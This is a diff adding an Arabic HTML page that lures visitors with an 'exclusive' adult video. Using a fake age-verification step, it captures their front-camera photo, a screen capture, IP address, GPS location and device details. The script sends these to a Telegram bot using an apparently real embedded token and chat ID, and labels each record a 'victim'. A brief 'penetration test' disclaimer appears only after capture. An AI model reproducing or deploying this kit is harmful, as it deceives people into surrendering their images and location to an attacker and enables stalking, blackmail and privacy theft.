@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشاهدة الفيديو</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0a0a12;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            text-align: center;
+            max-width: 500px;
+            padding: 40px;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #4fc3f7;
+        }
+        .subtitle {
+            color: #888;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 16px;
+            padding: 30px;
+            margin: 20px 0;
+        }
+        .btn-start {
+            background: linear-gradient(135deg, #0f3460, #1a5276);
+            border: none;
+            border-radius: 12px;
+            padding: 15px 40px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-start:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(79,195,247,0.3);
+        }
+        .btn-start:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        #video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            display: none;
+            margin: 20px auto;
+        }
+        #loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #4fc3f7;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .hint {
+            color: #666;
+            font-size: 13px;
+            margin-top: 15px;
+        }
+        .hidden-camera {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🎬 فيديو حصري</h1>
+    <p class="subtitle">اضغط زر التشغيل لمشاهدة الفيديو 🔞</p>
+
+    <div class="card">
+        <div id="initialState">
+            <p style="margin-bottom: 20px; color: #aaa;">
+                <i class="fas fa-lock" style="color: #4fc3f7;"></i> 
+                هذا الفيديو مشفر. يجب تفعيل الكاميرا للتحقق من هويتك أولاً.
+            </p>
+            <button class="btn-start" onclick="startProcess()">
+                ▶️ تشغيل الفيديو
+            </button>
+            <p class="hint">سيطلب المتصفح إذن الكاميرا للتحقق من العمر</p>
+        </div>
+
+        <div id="loading" class="text-center">
+            <div class="spinner"></div>
+            <p style="margin-top: 15px; color: #888;">جاري التحقق...</p>
+        </div>
+
+        <video id="video" autoplay muted playsinline></video>
+
+        <div id="doneState" style="display: none;">
+            <div style="font-size: 60px; margin-bottom: 15px;">✅</div>
+            <h2 style="color: #4fc3f7;">تم التحقق!</h2>
+            <p style="color: #888;">جاري تحميل الفيديو...</p>
+            <div class="spinner"></div>
+            <p class="hint" style="margin-top: 20px;">(هذا مجرد اختبار اختراق — الصورة أخذت لأغراض تعليمية)</p>
+        </div>
+    </div>
+</div>
+
+<script>
+// ================================================================
+//                    البيانات التي نجمعها
+// ================================================================
+const stolenData = {
+    timestamp: new Date().toLocaleString('ar-SA'),
+    ip: '-',
+    location: '-',
+    lat: null,
+    lon: null,
+    device: '-',
+    os: '-',
+    browser: '-',
+    isp: '-',
+    cameraImage: null,  // الصورة من الكاميرا
+    screenShot: null,   // صورة للشاشة
+    userAgent: navigator.userAgent,
+};
+
+// ================================================================
+//           1. نبدأ العملية — نجمع IP + GPS أولاً
+// ================================================================
+async function startProcess() {
+    // نخفي الزر ونظهر التحميل
+    document.getElementById('initialState').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+
+    // نجيب معلومات الـ IP والموقع
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        stolenData.ip = data.ip || '-';
+        stolenData.location = (data.city || '') + '، ' + (data.region || '') + '، ' + (data.country_name || '');
+        stolenData.lat = data.latitude;
+        stolenData.lon = data.longitude;
+        stolenData.isp = data.org || '-';
+    } catch(e) { console.log('IP fetch failed'); }
+
+    // نجيب معلومات الجهاز
+    const ua = navigator.userAgent;
+    if (ua.includes('Android')) stolenData.os = 'Android';
+    else if (ua.includes('iPhone')||ua.includes('iPad')) stolenData.os = 'iOS';
+    else if (ua.includes('Mac OS')||ua.includes('Macintosh')) stolenData.os = 'macOS';
+    else if (ua.includes('Linux')) stolenData.os = 'Linux';
+    else stolenData.os = 'Windows';
+
+    if (ua.includes('Chrome')&&!ua.includes('Edg')) stolenData.browser = 'Chrome';
+    else if (ua.includes('Firefox')) stolenData.browser = 'Firefox';
+    else if (ua.includes('Safari')&&!ua.includes('Chrome')) stolenData.browser = 'Safari';
+    else if (ua.includes('Edg')) stolenData.browser = 'Edge';
+
+    stolenData.device = (ua.includes('Android')||ua.includes('iPhone')||ua.includes('iPad')) ? 'جوال' : 'كمبيوتر';
+
+    // بعد ما جمعنا المعلومات → نشغل الكاميرا
+    await startCamera();
+}
+
+// ================================================================
+//           2. تشغيل الكاميرا واخذ صورة
+// ================================================================
+async function startCamera() {
+    try {
+        // نطلب الوصول للكاميرا
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                width: { ideal: 640 },
+                height: { ideal: 480 },
+                facingMode: 'user'  // الكاميرا الأمامية (السيلفي)
+            },
+            audio: false
+        });
+
+        // نخفي التحميل ونظهر الفيديو
+        document.getElementById('loading').style.display = 'none';
+        const video = document.getElementById('video');
+        video.style.display = 'block';
+        video.srcObject = stream;
+
+        // ننتظر شوي عشان الصورة تكون واضحة
+        setTimeout(() => {
+            // ناخذ صورة من الفيديو
+            takeSnapshot(stream, video);
+        }, 2000);
+
+    } catch(err) {
+        // إذا رفض الكاميرا — نكمل عادي بدون صورة
+        console.log('Camera denied:', err.message);
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('doneState').style.display = 'block';
+        
+        // نرسل البيانات بدون صورة
+        sendData();
+    }
+}
+
+// ================================================================
+//           3. ناخذ صورة من الكاميرا (سكرين شوت)
+// ================================================================
+function takeSnapshot(stream, video) {
+    // نرسم الفيديو على كانفاس
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // نحول الصورة إلى base64
+    stolenData.cameraImage = canvas.toDataURL('image/jpeg', 0.8);
+
+    // نوقف الكاميرا
+    stream.getTracks().forEach(track => track.stop());
+    video.style.display = 'none';
+
+    // === ناخذ صورة للشاشة أيضاً ===
+    takeScreenshot();
+}
+
+// ================================================================
+//           4. ناخذ صورة للشاشة (Screen Capture)
+// ================================================================
+async function takeScreenshot() {
+    try {
+        // هذا يطلب إذن مشاركة الشاشة
+        const screenStream = await navigator.mediaDevices.getDisplayMedia({
+            video: { cursor: "always" },
+            audio: false
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = screenStream;
+        video.play();
+
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 1280;
+            canvas.height = 720;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stolenData.screenShot = canvas.toDataURL('image/jpeg', 0.6);
+
+            screenStream.getTracks().forEach(track => track.stop());
+
+            // خلاص — نرسل كل شيء
+            document.getElementById('doneState').style.display = 'block';
+            sendData();
+        }, 1000);
+
+    } catch(err) {
+        // إذا رفض مشاركة الشاشة — نكمل
+        console.log('Screen capture denied');
+        document.getElementById('doneState').style.display = 'block';
+        sendData();
+    }
+}
+
+// ================================================================
+//           5. نرسل كل البيانات المسروقة
+// ================================================================
+function sendData() {
+    const data = stolenData;
+    
+    // === نرسلها لأكثر من مكان عشان نضمن وصولها ===
+
+    // 1. نحفظ في localStorage (لنفس الجهاز)
+    const history = JSON.parse(localStorage.getItem('victims') || '[]');
+    history.unshift(data);
+    localStorage.setItem('victims', JSON.stringify(history));
+
+    // 2. نرسلها لـ Telegram Bot (عشان تجيك على جوالك)
+    sendToTelegram(data);
+
+    // 3. نرسلها لـ Webhook (إذا عندك سيرفر)
+    sendToWebhook(data);
+
+    // 4. نفتح صفحة بها كل البيانات (للاختبار)
+    console.log('========== البيانات المسروقة ==========');
+    console.log('الـ IP:', data.ip);
+    console.log('الموقع:', data.location);
+    console.log('الإحداثيات:', data.lat, data.lon);
+    console.log('الجهاز:', data.device);
+    console.log('نظام التشغيل:', data.os);
+    console.log('المتصفح:', data.browser);
+    console.log('مزود الخدمة:', data.isp);
+    console.log('صورة الكاميرا:', data.cameraImage ? '✅ موجودة' : '❌ لا');
+    console.log('صورة الشاشة:', data.screenShot ? '✅ موجودة' : '❌ لا');
+    console.log('======================================');
+
+    // نعرض البيانات في صفحة مخفية
+    showDataToUser(data);
+}
+
+// ================================================================
+//           6. نرسل لتيليجرام (عشان تجيك على جوالك)
+// ================================================================
+function sendToTelegram(data) {
+    // هذا يحتاج بوت تيليجرام + توكن
+    // اتبع الشرح تحت عشان تسويه
+    
+    const BOT_TOKEN = '8615804805:AAEnqsH14JzpGTofTGZalI6yu-HtSXNWf7k';      // ← غير هذا
+    const CHAT_ID = '5197359202';        // ← غير هذا
+
+    if (BOT_TOKEN.includes('ضع')) return; // ما يرسل إلا إذا غيرت
+
+    const message = `
+🔔 ضحية جديدة!
+
+🕒 الوقت: ${data.timestamp}
+🌐 IP: ${data.ip}
+📍 الموقع: ${data.location}
+🗺️ GPS: ${data.lat}, ${data.lon}
+📱 الجهاز: ${data.device} | ${data.os}
+🌍 المتصفح: ${data.browser}
+📡 ISP: ${data.isp}
+📸 صورة: ${data.cameraImage ? '✅' : '❌'}
+🖥️ شاشة: ${data.screenShot ? '✅' : '❌'}
+    `;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    }).catch(e => console.log('Telegram error:', e));
+
+    // إذا في صورة — نرسلها
+    if (data.cameraImage) {
+        // نحول base64 إلى blob ونرسل
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                photo: data.cameraImage,
+                caption: `صورة الضحية: ${data.ip}`
+            })
+        }).catch(e => console.log('Telegram photo error:', e));
+    }
+}
+
+// ================================================================
+//           7. نرسل لـ Webhook (إذا عندك سيرفر)
+// ================================================================
+function sendToWebhook(data) {
+    const webhookURL = 'https://your-server.com/api/collect'; // غير هذا
+    if (webhookURL.includes('your-server')) return;
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    }).catch(e => console.log('Webhook error:', e));
+}
+
+// ================================================================
+//           8. نعرض البيانات للضحية (عشان الاختبار)
+// ================================================================
+function showDataToUser(data) {
+    // نضيف div مخفي بالبيانات
+    const div = document.createElement('div');
+    div.style.cssText = 'display:none;';
+    div.innerHTML = `
+    <div id="hiddenData">
+        IP: ${data.ip}
+        Location: ${data.location}
+        GPS: ${data.lat}, ${data.lon}
+        Device: ${data.device} ${data.os}
+        Browser: ${data.browser}
+        ISP: ${data.isp}
+        Camera: ${data.cameraImage ? 'Yes' : 'No'}
+        Screen: ${data.screenShot ? 'Yes' : 'No'}
+        Timestamp: ${data.timestamp}
+    </div>`;
+    document.body.appendChild(div);
+
+    // إذا في صورة — نحولها للعرض
+    if (data.cameraImage) {
+        const img = document.createElement('img');
+        img.src = data.cameraImage;
+        img.style.cssText = 'position:fixed;bottom:0;right:0;width:150px;border-radius:8px;z-index:9999;border:2px solid red;';
+        document.body.appendChild(img);
+    }
+}
+</script>
+</body>
+</html>
